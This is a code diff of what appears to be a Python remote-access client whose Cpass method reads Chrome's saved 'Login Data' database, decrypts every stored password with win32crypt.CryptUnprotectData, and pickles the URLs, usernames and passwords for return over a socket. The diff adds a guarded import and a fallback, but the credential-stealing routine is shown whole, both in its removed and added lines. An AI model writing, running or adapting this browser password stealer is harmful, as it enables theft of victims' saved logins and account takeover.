@@ -3,11 +3,17 @@ import subprocess
 import os
 import json
 import sqlite3
-import win32crypt
 import pickle
 import sys
 from Mods import run
 import threading
+
+try:
+    import win32crypt
+    win32 = True
+except:
+    print("import error")
+    win32 = False
 
 host = '127.0.0.1'
 port = 1234
@@ -45,43 +51,46 @@ class client:
             self.sock.send(b'error')
     
     def Cpass(self):
-        path = os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
-        connectDB = os.path.join(path, 'Login Data')
-        conn = sqlite3.connect(connectDB)
-        def extract():
-            sqlquery = "SELECT origin_url FROM logins"
-            cur = conn.cursor()
-            cur.execute(sqlquery)
-            f = cur.fetchall()
-            URl = []
-            for i in range(len(f)):
-                URl.append(f[i][0])
-
-            user = []
-            password = []
-            for i in URl:
-                sqlquery = "SELECT username_value FROM logins WHERE origin_url=\'%s\'"%(i) 
-                cur.execute(sqlquery)
-                f = cur.fetchall()      
-                user.append(f[0][0])
-                sqlquery = "SELECT password_value FROM logins WHERE origin_url=\'%s\'"%(i)
+        if win32:
+            path = os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
+            connectDB = os.path.join(path, 'Login Data')
+            conn = sqlite3.connect(connectDB)
+            def extract():
+                sqlquery = "SELECT origin_url FROM logins"
+                cur = conn.cursor()
                 cur.execute(sqlquery)
                 f = cur.fetchall()
-                try:
-                    pwd = win32crypt.CryptUnprotectData(f[0][0], None, None, None, 0)
-                except Exception as e:
-                    print(e)
-                password.append(pwd[1].decode())
-            list = {}
-            for i in range(len(URl)):
-                #list.append("USER: {0},     PASS: {1},      URL: {2}".format(user[i], password[i], URl[i]))
-                list[i] = {'USER':user[i], 'PASS':password[i], 'URL':URl[i]}
-            return list
-        l = extract()
-        for i in l:
-            print(i)
-        return pickle.dumps(l)
-        
+                URl = []
+                for i in range(len(f)):
+                    URl.append(f[i][0])
+
+                user = []
+                password = []
+                for i in URl:
+                    sqlquery = "SELECT username_value FROM logins WHERE origin_url=\'%s\'"%(i) 
+                    cur.execute(sqlquery)
+                    f = cur.fetchall()      
+                    user.append(f[0][0])
+                    sqlquery = "SELECT password_value FROM logins WHERE origin_url=\'%s\'"%(i)
+                    cur.execute(sqlquery)
+                    f = cur.fetchall()
+                    try:
+                        pwd = win32crypt.CryptUnprotectData(f[0][0], None, None, None, 0)
+                    except Exception as e:
+                        print(e)
+                    password.append(pwd[1].decode())
+                list = {}
+                for i in range(len(URl)):
+                    #list.append("USER: {0},     PASS: {1},      URL: {2}".format(user[i], password[i], URl[i]))
+                    list[i] = {'USER':user[i], 'PASS':password[i], 'URL':URl[i]}
+                return list
+            l = extract()
+            for i in l:
+                print(i)
+            return pickle.dumps(l)
+        else:
+            return pickle.dumps({'USER':'N/A', 'PASS':'N/A', 'URL':'N/A'})
+            
 
     def recv(self):
         try:
